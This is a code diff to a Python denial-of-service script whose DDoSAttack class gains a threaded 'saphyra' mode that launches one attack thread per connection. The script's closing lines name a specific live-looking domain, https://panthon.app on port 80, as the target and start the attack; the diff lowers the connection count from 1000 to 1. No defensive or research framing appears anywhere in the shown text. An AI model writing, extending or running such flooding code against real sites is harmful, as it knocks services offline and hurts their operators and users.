@@ -8,6 +8,7 @@ import sys
 import platform
 from urllib.parse import urlparse
 import socket
+import threading
 
 logging.basicConfig(
     level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s"
@@ -16,7 +17,11 @@ logging.basicConfig(
 
 class DDoSAttack:
     def __init__(
-        self, target_url, target_port, num_connections, attack_type="asyncrone"
+        self,
+        target_url,
+        target_port=None,
+        num_connections=None,
+        attack_type="asyncrone",
     ):
         self.target_url = target_url
         self.target_port = target_port
@@ -26,7 +31,13 @@ class DDoSAttack:
         self.model = RandomStringGenerator(100)
 
     def create_connection(self):
-        self.run_attack()
+        if self.attack_type == "asyncrone":
+            self.run_attack()
+        elif self.attack_type == "saphyra":
+            for _ in range(self.num_connections):
+                thread = threading.Thread(target=self.run_attack)
+                thread.start()
+                self.threads.append(thread)
 
     def run_attack(self):
         if self.attack_type == "asyncrone":
@@ -90,7 +101,7 @@ class DDoSAttack:
 # Target parameters
 target_url = "https://panthon.app"
 target_port = 80
-num_connections = 1000
+num_connections = 1
 
 # Create and launch attack
 attack = DDoSAttack(target_url, target_port, num_connections, "saphyra")
